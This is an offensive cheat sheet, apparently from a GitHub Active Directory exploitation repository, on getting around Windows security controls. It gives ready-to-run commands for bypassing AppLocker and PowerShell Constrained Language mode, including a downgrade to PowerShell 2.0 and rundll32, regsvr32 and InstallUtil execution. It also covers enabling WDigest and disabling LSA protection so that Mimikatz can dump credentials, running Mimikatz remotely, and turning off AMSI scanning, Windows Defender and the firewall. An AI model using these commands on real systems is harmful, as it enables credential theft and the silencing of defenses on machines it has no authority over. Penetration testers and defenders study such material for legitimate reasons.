## This app has been blocked by your system administrator !!!


#### CHECK WHERE YOU CAN DROP YOUR BINARY
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

---
#### CHECK POWERSHELL LANGUAGE MODE
```powershell
$ExecutionContext.SessionState.LanguageMode
```

#### POWERSHELL VERSION DOWNGRADE
```powershell
# CHECK IF OLD VERSION STILL ACTIVATED
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
# ABUSE
powershell.exe -version 2.0
```
Constrained Language mode was introduced with PowerShell 3.0 and can easily be bypassed by a hacker switching to an older version.

- Can not run ps1 ?
    - Include you function inside the ps1 and exec .\script.ps1
    - rundll32.exe .\your.dll,Void
    - REGSVR32 "C:PATH\your.dll"
    - .NET
    ```C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\PATH\Bypass.exe```



#### CHANGE LANGUAGE MODE
- POWERSHELL COMMAND
    ```powershell
    $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
    #Note : You can switch to different mode, but you can not change after a ConstrainedLanguage.
    ```

- REGISTRY PATH
    ```powershell
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
    ```
    - KEY
    ```powershell
    __PSLockdownPolicy
    ```
    - POSSIBLE VALUES
    ```powershell
    Data 1 : FullLanguage. 
    Data 2 : RestrictedLanguage. 
    Data 3 : NoLanguage. 
    Data 4 : ConstrainedLanguage
    ```
- SYSTEM ENVIRONNEMENT VARIABLE
    ```
    Control Pannel / System & Security / System
    System Properties
    Environment Variables
    New
    __PSLockDownPolicy
    Value X
    ```
- Group Policies
    ```powershell
    User Configuration
    Preferences
    Windows Settings
    Environment
    Set you raviable __PSLockDownPolicy via GPO
    ```


---
#### MIMIKATZ ERROR kuhl_m_privilege_simple
```powershell
# NEED SeDebugPrivilege
# Group Policy Management Editor -> Windows Settings -> Security Settings -> Local Policies -> User Rights Assignment -> Debug programs -> Define these policy settings
```
#### MIMIKATZ ERROR kuhl_m_sekurlsa_acquireLSA
```powershell
# ENEABLE WDigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
``` 
#### MIMIKATZ ERROR kuhl_m_sekurlsa_acquireLSA
```powershell
# DISABLE LSA Protection
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0
``` 
#### MIMIKATZ ERROR kuhl_m_lsadump_secretsOrCache
```powershell
# Computer Configuration -> Windows Settings -> Local Policy -> Security Options -> Interactive Logon: Number of previous logons to cache -> 10
``` 

---
#### Disable AMSI
```powershell
# LOCAL
Set-MpPreference -DisableIOAVProtection $true
# Remote
$sess = New-PSSession -ComputerName websrv.domain.local
Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess
# REMOTE MIMIKATZ
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

---
#### DISABLE WINDOWS DEFENDER
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```
#### REMOVE WINDOWS DEFENDER
```powershell
Uninstall-WindowsFeature -Name Windows-Defender
```

#### DISABLE FIREWALL
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-NetFirewallProfile -Profile * -Enabled True
```

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)